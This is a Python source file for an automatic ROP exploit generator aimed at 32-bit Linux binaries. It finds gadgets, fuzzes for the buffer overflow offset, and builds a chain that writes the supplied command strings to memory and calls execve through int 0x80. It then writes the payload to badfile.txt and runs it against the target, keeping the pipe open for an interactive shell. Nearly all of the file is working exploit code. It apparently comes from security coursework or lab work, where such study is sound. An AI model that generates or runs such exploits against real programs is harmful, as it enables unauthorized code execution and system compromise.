# Command line args of vulnerable program binray (maybe uncompiled) and of the commands to insert
import sys
import os
import subprocess
import struct
import re
from struct import pack
import argparse

import fuzzing
import gadgetfinder as gf

    


def build_rop_chain(commands, gadgets):
    # print("Building ROP chain for commands:", commands)
    # Unpack gadgets
    MOVISTACK, POPEDX, POPEAX, XOREAX, INCEAX, POPEBX, POPECX, INT80, STACK, DUMMY = gadgets
    
    # Handle STACK address format
    if isinstance(STACK, bytes):
        stack_addr = struct.unpack("<I", STACK)[0]
    else:
        stack_addr = STACK
    
    buff = b""
    
    
    string_addresses = []
    current_string_addr = stack_addr
    
    for command in commands:

        if len(command) % 4 != 0:
            remainder = 4 - (len(command) % 4)
            if "/" in command:
                idx = command.index("/")
                command = command[:idx+1] + ("/" * remainder) + command[idx+1:]
            else:
                print("Warning: Command length not multiple of 4 and no '/' to pad. ")
                sys.exit(1)

        
        cmd_bytes = command.encode('latin-1') # Null-terminate the string
        
        for i in range(0, len(cmd_bytes), 4):
            chunk = cmd_bytes[i:i+4]
            if len(chunk) < 4:
                chunk = chunk + b'\x00' * (4 - len(chunk))
            

            buff += POPEDX
            buff += pack("<I", stack_addr) 

            buff += POPEAX
            buff += chunk
            

            buff += MOVISTACK
            
            stack_addr += 4
        buff += POPEDX
        buff += pack("<I", stack_addr) # Address to write 0 to
        buff += XOREAX                 # EAX = 0
        buff += MOVISTACK       
        
        stack_addr += 4
        string_addresses.append(current_string_addr)
        current_string_addr = stack_addr

    
    argv_start = stack_addr
    # print("argv start address:", hex(argv_start))
    # print(hex(0x0809e100))
    # print(hex(string_addresses[0]))

    for addr in string_addresses:

        buff += POPEDX
        buff += pack("<I", stack_addr)
        buff += POPEAX
        buff += pack("<I", addr)
        buff += MOVISTACK
        stack_addr +=4
    # Final NULL pointer
    buff += POPEDX
    buff += pack("<I", stack_addr)
    buff += POPEAX
    buff += pack("<I", 0)
    buff += MOVISTACK
    stack_addr += 4


    buff += POPEBX
    buff += pack("<I", string_addresses[0])


    buff += POPECX
    buff += pack("<I", argv_start)
    buff += DUMMY

    buff += POPEBX
    buff += pack("<I", string_addresses[0])

    buff += POPEDX
    buff += pack("<I", 0)

    
    buff += XOREAX
    
    buff += INCEAX*11

    # --- STEP 3: Trigger ---
    buff += INT80

    # print(buff)

    
    return buff








if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Automatic ROP Exploit Generator",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument("program", help="Path to the vulnerable executable")

    parser.add_argument("commands", nargs='+', help="Commands to execute in the vulnerable program (e.g. '1', '2', '3')")
    
    parser.add_argument(
        "--fileinput", 
        choices=[0, 1], 
        type=int, 
        default=None,
        help="1 = Pass input via file argument\n0 = Pass input via STDIN pipe\n(Default: Auto-detect)"
    )
    
    parser.add_argument(
        "--inputs", 
        type=str, 
        default=None, 
        help="Input template/prefix to reach the vulnerable function.\nAccepts escape chars (e.g. '1\\n2\\n')."
    )
    
    parser.add_argument(
        "--flags", 
        type=str, 
        default=None, 
        help="Extra flags/arguments to pass to the vulnerable binary (e.g. '-v' or '--debug')."
    )
    parser.add_argument(
        "--brute-depth",
        type=int,
        default=None,
        help="Maximum depth for brute-force padding (Default: 100). If set to 0, disables brute-force and uses the input template only."
    )
    args = parser.parse_args()

    # --- Step 1: Validation ---
    if not os.path.isfile(args.program):
        print(f"[-] Error: The file {args.program} does not exist.")
        sys.exit(1)

    # --- Step 2: Gadget Extraction ---
    print("[*] Finding gadgets...")
    gf.find_gadgets(args.program) # Generates ropchain.txt
    
    try:
        gadgets = gf.extract_gadgets() # Parses ropchain.txt
        print("[+] Gadgets extracted successfully.")
    except Exception as e:
        print(f"[-] Error extracting gadgets: {e}")
        sys.exit(1)

    # --- Step 3: Fuzzing & Offset Detection ---
    print("[*] Starting Fuzzer to find offset...")
    
    # Call the fuzzer 
    brute_number, offset = fuzzing.fuzz(
        vulnerable_program=args.program,
        fileinput=args.fileinput,
        input_template=args.inputs,
        flags=args.flags,
        brute_depth=args.brute_depth,
        print_debug=False
    )

    if offset is None or offset == -1:
        print("[-] Fuzzing failed. Could not determine offset.")
        sys.exit(1)

    print(f"[+] Buffer overflow offset confirmed: {offset} bytes.")

    # --- Step 4: Construct Payload ---
    print("[*] Constructing ROP Chain...")

    # A. Get the Prefix
    # If the user provided inputs, we use them. 
    prefix = fuzzing.parse_input_template(args.inputs)
    
    if brute_number:
        prefix += b"A" * brute_number

    # B. Create Junk Padding
    padding = b"A" * offset
    
    # C. Build ROP Chain
    rop_chain = build_rop_chain(args.commands, gadgets)
    
    # D. Combine
    # [ Menu Inputs | Brute-Force-Inputs] + [ Junk to reach EIP ] + [ ROP Chain ]
    full_payload = prefix + padding + rop_chain
    
    print(f"[+] Total payload size: {len(full_payload)} bytes")

    # --- Step 5: Execution ---
    filename = "badfile.txt"
    with open(filename, "wb") as f:
        f.write(full_payload)
    print(f"[+] Payload written to {filename}")

    # Detect Input Mode for final execution (in case auto-detect was used)
    if args.fileinput is None:
        use_file_mode = fuzzing.find_if_fileinput(args.program, args.flags.split() if args.flags else [])
    else:
        use_file_mode = bool(args.fileinput)

    print(f"[*] Executing exploit (Mode: {'File' if use_file_mode else 'STDIN'})...")
    print("-" * 40)

    try:
        if use_file_mode:
            subprocess.run([f"./{args.program}", filename])
        else:
            # We use shell=True here to easily handle the piping: (cat badfile; cat) | ./vuln
            # This keeps the pipe open for interaction if we spawn a shell
            print("Press RETURN")
            cmd = f"(cat {filename}; cat) | ./{args.program}"
            subprocess.run(cmd, shell=True)
            
    except KeyboardInterrupt:
        print("\n[*] Exiting.")
    
    # # Check if the vulnerable program exists
    # if not os.path.isfile(vulnerable_program):
    #     print(f"Error: The file {vulnerable_program} does not exist.")
    #     sys.exit(1)


    # # Step 1: Extract gadgets using ROPgadget
    # gf.find_gadgets(vulnerable_program)
    # print("Gadgets extracted using ROPgadget.")

    # # Step 2: Parse ropchain.txt to find gadgets and .data address

    # (gadgets) = gf.extract_gadgets()
    # print("Gadgets extracted from ropchain.txt.")

    # # Step 3: Find Buffer Overflow Offset
    # offset = fuzzing.fuzz(
    #         vulnerable_program=args.program,
    #         fileinput=args.fileinput,
    #         input_template=args.inputs,
    #         flags=args.flags,
    #         brute_depth=args.brute_depth,
    #         print_debug=True
    #     )
    # file_input = fuzzing.find_if_fileinput(vulnerable_program)
    # p = b'A' * fuzzing.find_offset(vulnerable_program, file_input)
    # print(f"Buffer overflow offset found: {len(p)} bytes.")

    # # Step 4: Build ROP Chain for each command

    # rop_chain  = build_rop_chain(commands, gadgets)
    # p += rop_chain
    # print(f"ROP chain built with size {len(rop_chain)} bytes.")

    # # Step 5: Write to badfile.txt
    # with open("badfile.txt", "wb") as f:
    #     f.write(p)
    # print(f"ROP chain written to badfile.txt with total size {len(p)} bytes.")

    # # Run the vulnerable program with the payload
    # if file_input:
    #     subprocess.run([f"./{vulnerable_program}", "badfile.txt"])
    # else:
    #     subprocess.run([f"(cat badfile.txt; cat) | ./{vulnerable_program}"], shell=True)
    #     print("Press RETURN to continue...")


